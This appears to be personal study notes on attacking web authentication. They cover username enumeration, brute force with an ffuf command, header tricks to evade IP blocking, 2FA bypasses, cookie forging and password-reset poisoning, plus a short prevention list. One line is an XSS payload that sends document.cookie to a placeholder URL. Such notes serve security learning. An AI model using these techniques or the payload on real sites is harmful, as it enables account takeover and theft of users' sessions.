
### General Notes

The process of verifying the identity of a user.
* Knowledge Factors: Something you know, like a password.
* Possession Factors: Something you have, like a security token.
* Inherence Factors: Something you are, like biometrics.

> Authentication is verifying that a user is who they claim to be.
> Authorization is verifying whether a user is allowed to do something.

---
### Username-Password Attacks

Against websites that have username-password based login mechanisms.
##### Brute Force Attacks

Trial and error attempts to guess valid user credentials while paying attention to:
1. Status Codes: [[HTTP]] response codes can be observed. Sometimes the right username gives a different response than a wrong username.
2. Error Messages: Returned error messages are sometimes different when both username *and* password are incorrect, not just one of them. Observe characters for spelling mistakes, and so on. Check [[Authentication#Attack using ffuf]].
3. Response Times: Observe response times. Sometimes websites will check password only if username is correct, so the response time increases. Can be checked by entering really large passwords, to make the website take longer to respond.
4. Response sizes.

> Can be done via [[Burp Suite]] Intruder. To ensure 1 request is sent a time (if needed), go to resources pool tab and set the max concurrent requests to 1.

If there is [[IP]] blocking, use the `X-Forwarded-For` [[HTTP]] header to change the IP address.

If there is account locking, check all the usernames and don't exceed the password limit trials.

User rate limiting occurs when making too many login attempts in a short period of time causing the [[IP]] to get blocked, and [[IP]] can be unblocked by:
1. Manually by admin.
2. Manually by user after completing a CAPTCHA.
3. Automatically after a certain time period.

> User rate limiting can be bypassed by trying multiple passwords in one login request. 
##### Default Passwords

An important element to try is default username-password combinations.
- SecLists has a default password directory: `/seclists/Passwords/Default-Credentials` with many files.

###### Attack using [[ffuf]]

To brute force usernames, we can use `ffuf` to check for different responses that can give us hints about their existence.

We can exploit the difference in error messages returned when a valid and an invalid username is entered.
```bash
ffuf -w <wordlist> -u <URL> -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=whatever" -fr "Invalid username"
```
- This is a `POST` request to a login form, so the data and headers must be added. Check section 5.
- The data `-d` parameters should be obtained from the target website, `username` and `password` are just examples.
- The `-fr` flag is used to filter out the string `Invalid username`.

> The same can be done to attack passwords by simply changing the location of the `FUZZ` parameter.

---
### Multi-Factor Authentication

##### Bypassing Two-Factor Authentication

When users login and then are asked to enter some sort of verification code, they are already logged in.
- Sometimes, some pages are loaded before this verification stage is completed.
- To exploit this, login as a normal user and observe the URL paths that are after the verification stage.
- Then login as the victim user, and once asked for the verification, simply change the URL to another path to see if this stage can be altogether skipped.

##### Flawed Two-Factor Authentication

After user has logged in, the website doesn't properly verify that it is the same user completing the second step; verification.
- Users are assigned [[Cookies]] when they are logged in that relate to their account. 
- This cookie is the same one that is taken to the verification stage.
- When the verification code is submitted, the cookie is used to determine the account the user is trying to access.

An attacker could login using his credentials, and then change his cookie to that of a victim user's.
- He would then have to brute force or guess the verification code in order to gain access to that account without even needing the password.

> Use the [[Burp Suite]] Turbo Intruder extension for increased speed in brute forcing verification codes. Can also be used to change macros, such as changing the session or logging in/out to avoid being blocked.

---

### Other Authentication Mechanisms

##### Keeping Users Logged In

The 'remember me' feature is implemented by storing persistent [[Cookies]].
- Access to these cookies is dangerous as it skips the entire login process.
- These cookies can be generated via static value concatenation such as username, timestamp, password.

If attacker can study their own cookie, they can figure out how these cookies are generated.
- Some websites have [[Web Encoding]] such as Base64, which can be easily decrypted.
- Using hashing functions is also not perfect as if the attacker identifies the hashing algorithm, they can brute force it using a wordlist using tools such as [[John the Ripper]].

If attacker can't create an account, they can using [[Cross Site Scripting (XSS)]] steal another user's cookie and deduce how the cookie forms.
- Performing a stored attack to steal cookies:
``` HTML
<script>document.location='URL-to-send-to/'+document.cookie</script>
```

##### Resetting User Passwords

Through the URL, users are taken to a unique page to reset their password.
```
http://website.com/reset-password?user=<victim>
```
- Not secure as attacker could change the victim username to any user and can change any users password.

Sometimes websites use a long token for each user that is checked in the backend and then destroyed shortly after resetting the password.
- Sometimes, websites don't validate tokens. So attackers could reset their own password and then obtain that token.
- Then they can change that token to gain access to any user they need that also requested to change their password.
- This can be done by trying to delete the token value, and see if the website still responds properly.

Another technique is to steal another user's token.
- Use the `X-Forwarded-Host` [[HTTP]] header to send the reset password email. 
- Let the value of that header to be my own website, so i can see the requests if clicked on by the victim user.

Having the victim user token, I can open my own reset password page, but change the token to that of the victim user's.
- I can then reset the password to be whatever i like.

---

### Preventing Authentication Attacks

* Taking care with user credentials.
	* Never send login data over unencrypted connections.
	* Any [[HTTP]] to be converted to [[HTTPS]].
	* Audit the website so no private information is disclosed.
* Do not count on users for security.
	* Effective password policy.
* Prevent username enumeration.
	* Using identical generic error messages.
	* Return same status codes for any login request.
	* Make response times indistinguishable.
* Protect against brute force.
	* [[IP]]-based user rate limiting.
	* Prevent attackers from manipulating their IP address.
	* Complete CAPTCHA tests with each login attempt after a limit.
* Proper Multi-Factor Authentication.

---
